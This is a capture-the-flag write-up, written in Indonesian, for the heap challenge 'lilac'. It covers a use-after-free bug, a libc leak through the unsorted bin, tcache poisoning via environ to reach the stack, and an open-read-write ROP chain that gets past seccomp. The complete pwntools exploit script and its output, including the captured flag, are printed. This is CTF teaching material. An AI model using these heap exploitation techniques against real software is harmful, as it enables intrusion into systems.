# lilac

## Binary specifications

```
15:28:07 › file chall; checksec chall
chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1daba7e4cbf2f89dda3baf36f98200b76f66f686, for GNU/Linux 3.2.0, not stripped
[*] '/home/chao/Documents/FastTekno/pwn/lilac/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

Binary memiliki spesifikasi 64 bit dengan full proteksi, dari spesifikasi ini sudah jelas sekali tipikal soal-soal heap. Untuk memastikan bahwa ini memang soal heap, bisa di buka di IDA Pro.<br>
Libc juga di lampirkan dengan versi 2.31 bit dimana akan terdapat sistem tcache pada heap.<br>
Untuk mempesulit soal, probset memberikan filter seccomp yang hanya bisa memperbolehkan syscall open, read write

## Bug

Bug terdapat pada fungsi delete dimana pada saat binary melakukan free terhadap suatu chunk namun chunk tersebut tidak di **null** kan sehingga dapat dilakukan free 2 kali ataupun edit chunk yang sudah di free karena data di anggap masih ada di dalam chunk tersebut. Bug ini biasa disebut dengan **Use After Free**

## Exploitation

Dari bug itu, kita bisa manfaatin **unsorted bin** untuk dapetin address libc.
Di libc 2.25 keatas itu kalo sebuah chunk dengan size dibawah 0x408 di free, chunknya bakal ter-free ke tcache bin, trus jumlah maksimal tcache bin itu cuma 7 bin. Kalo kita melakukan free lebih dari 7 kali dengan size yang sama, chunknya bakal ter-free ke unsorted bin yang nyimpen fd pointer dan bk pointer yang merupakan libc pointer ngarah ke address main arena di libc.<br>
Kalo pake teori ini, kita bisa leak libc dengan bug **use after free** sih.<br>

Jadi ide untuk mendapatkan leak libc bisa disimpulkan seperti ini:

1. Isi tcache bin dengan size yang sama(misalnya 0x90) sebanyak 7 kali agar free selanjutnya masuk ke unsorted bin.
2. Unsorted bin punya pointer yg ngarah ke libc main arena, trus karena ada bug **UAF** kita bisa leak libc nya.

Nah kalo ide ini di buat dalam bentuk script, scriptnya bakal jadi kaya gini:

```Python
for i in range(9): alloc(i, 0x80)
# for i in range(8, 10): alloc(i, 0x)
for i in range(8): free(i) # ngisi tcache bin

show(7) # index ke 7 akan berisi fd pointer yang mengarah ke main arena
p.recvuntil("Content: ")
libc_leak =  u64(p.recvline()[:-1].ljust(8, '\x00'))
log.info("Libc leak: {}".format(hex(libc_leak)))
```

Sebelum membuat script, aku uda buat beberapa fungsi sih untuk alloc, delete, view, dan edit untuk mempermudah pembuatan script.
Hasil dari script tersebut:

```
15:30:43 › python exploit.py
[+] Opening connection to 103.145.226.168 on port 30204: Done
[*] '/home/chao/Documents/FastTekno/pwn/lilac/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Libc leak: 0x7fe2b9a38be0
```

Karena libc sudah didapat, jadi kita tinggal kalkulasiin seluruh address libc yang dibutuhkan.<br>
Sekarang permasalahannya itu:

1. Bagaimana cara kita mendapatkan flag dari binary yang tidak bisa melakukan exec shell?
2. Bagaimana cara kita melakukan ROP ORW dari heap?

Karena binary ga bisa melakukan exec shell, jadi kita harus melakukan read dan write sendiri terhadap flag, trus untuk ROP ORW sebenernya kita ga akan ROP dari heap sih tapi dari stack.<br>

Jadi sekarang muncul permasalahan baru, gimana sih cara rop dari stack? ini kan soal heap. <br>

Jadi di libc itu ada variabel yg namanya environ, nah di variabel ini itu nyimpen address stack. karena ada bug **UAF** kita bisa ngepoison tcache nya dan ngubah address next alloc di tcache nya. Karena tadi uda dapet libc leak berarti kita bisa dapetin libc environ, kan gampang tinggal itung" dikit doang. Untuk melakukan leak stack, scriptnya aku buat kaya gini.

```
edit(6, p64(libc_environ))
alloc(9, 0x80)
alloc(10, 0x80)

show(10)
p.recvuntil("Content: ")

stack_leak = u64(p.recvline()[:-1].ljust(8, '\x00'))
log.info("Stack leak: {}".format(hex(stack_leak)))
```

Pas aku udah edit index ke 6, state tcachenya nanti bakal kaya gini

```
(0x90)   tcache_entry[7](7): 0x557ce5d58b40 --> 0x7f39366932e0 --> 0x7ffc179d5088 --> 0x7ffc179d62ae --> 0x52454d554e5f434c (invaild memory)
```

Nah, jadi kalo kita alloc 2 kali, nanti memory alokasi yg kedua itu bakal berisi address stack. Tinggal view doang dah abis itu. <br>

Nah karena uda dapet leak stack, bisa di kalkulasiin sendiri untuk return addressnya abis tu tinggal tcache poisoning lagi biar alokasi memory selanjutnya dialokasikan ke ret address.

Abis tu tinggal alloc aja terus sampe dapet ret address trus ROP dari sana. Done.<br>

Full script:

```python
from pwn import *

p = process("./chall")
# p = remote("103.145.226.168", 30204)
binary = ELF("./chall")

def alloc(idx, size):
  p.sendlineafter(">> ", '1')
  p.sendlineafter(": ", str(idx))
  p.sendlineafter(": ", str(size))

def edit(idx, content):
  p.sendlineafter(">> ", "2")
  p.sendlineafter(": ", str(idx))
  p.sendafter(": ", content)

def show(idx):
  p.sendlineafter(">> ", "4")
  p.sendlineafter("Index: ", str(idx))

def free(idx):
  p.sendlineafter(">> ", "3")
  p.sendlineafter(": ", str(idx))

for i in range(9): alloc(i, 0x80)
# for i in range(8, 10): alloc(i, 0x)
for i in range(8): free(i) # ngisi tcache bin

show(7)
p.recvuntil("Content: ")
libc_leak =  u64(p.recvline()[:-1].ljust(8, '\x00'))
log.info("Libc leak: {}".format(hex(libc_leak)))
libc_base = libc_leak - 0x1ebbe0
log.info("Libc base: {}".format(hex(libc_base)))
libc_system = libc_base + 0x55410
log.info("Libc system: {}".format(hex(libc_system)))
libc_free_hook = libc_base + 0x1eeb28
log.info("Libc __free_hook: {}".format(hex(libc_free_hook)))
libc_environ = libc_base + 0x00000000001ef2e0
log.info("Libc environ: {}".format(hex(libc_environ)))
libc_read = libc_base + 0x111130
log.info("Libc read: {}".format(hex(libc_read)))
pop_rdi = libc_base + 0x0000000000026b72
log.info("Pop rdi: {}".format(hex(pop_rdi)))
pop_rsi = libc_base + 0x0000000000027529
log.info("Pop rsi: {}".format(hex(pop_rsi)))
pop_rdx_rbx = libc_base + 0x0000000000162866
log.info("Pop rdx rbx: {}".format(hex(pop_rdx_rbx)))
pop_rax = libc_base + 0x000000000004a550
log.info("Pop rax: {}".format(hex(pop_rax)))
syscall = libc_base + 0x000000000004b460
log.info("Syscall: {}".format(hex(syscall)))
pop_rcx = libc_base + 0x000000000009f822
log.info("Pop rcx: {}".format(hex(pop_rcx)))
libc_puts = libc_base + 0x0875a0
log.info("Libc puts: {}".format(hex(libc_puts)))

edit(6, p64(libc_environ))
alloc(9, 0x80)
alloc(10, 0x80)

show(10)
p.recvuntil("Content: ")

stack_leak = u64(p.recvline()[:-1].ljust(8, '\x00'))
log.info("Stack leak: {}".format(hex(stack_leak)))
ret_addr = stack_leak - 0x120
log.info("Ret addr: {}".format(hex(ret_addr)))

alloc(11, 0xf8)
alloc(12, 0xf8)
free(12)
free(11)
edit(11, p64(ret_addr))

alloc(13, 0xf8)
alloc(14, 0xf8)
edit(13, '/home/lilac/flag.txt\x00')

show(4)
p.recvuntil("Content: ")

heap_leak = u64(p.recvline()[:-1].ljust(8, '\x00'))
log.info("Heap leak: {}".format(hex(heap_leak)))
flag_loc = heap_leak + 0x360
log.info("Flag loc: {}".format(hex(flag_loc)))

payload = ''
payload += p64(pop_rdi)
payload += p64(flag_loc)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx_rbx)
payload += p64(0) * 2
payload += p64(pop_rcx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(2)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(flag_loc)
payload += p64(pop_rdx_rbx)
payload += p64(0x100) * 2
payload += p64(libc_read)

payload += p64(pop_rdi)
payload += p64(flag_loc)
payload += p64(libc_puts)

edit(14, payload)


p.interactive()
```

Run script

```
16:08:04 › python exploit.py
[+] Opening connection to 103.145.226.168 on port 30204: Done
[*] '/home/chao/Documents/FastTekno/pwn/lilac/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Libc leak: 0x7f5f64f7abe0
[*] Libc base: 0x7f5f64d8f000
[*] Libc system: 0x7f5f64de4410
[*] Libc __free_hook: 0x7f5f64f7db28
[*] Libc environ: 0x7f5f64f7e2e0
[*] Libc read: 0x7f5f64ea0130
[*] Pop rdi: 0x7f5f64db5b72
[*] Pop rsi: 0x7f5f64db6529
[*] Pop rdx rbx: 0x7f5f64ef1866
[*] Pop rax: 0x7f5f64dd9550
[*] Syscall: 0x7f5f64dda460
[*] Pop rcx: 0x7f5f64e2e822
[*] Libc puts: 0x7f5f64e165a0
[*] Stack leak: 0x7ffff4444cb8
[*] Ret addr: 0x7ffff4444b98
[*] Heap leak: 0x559033ddf990
[*] Flag loc: 0x559033ddfcf0
[*] Switching to interactive mode
Chunk edited
FastTekno{pop_rdi_pop_rsi_pop_rax_syscall_orw}
```
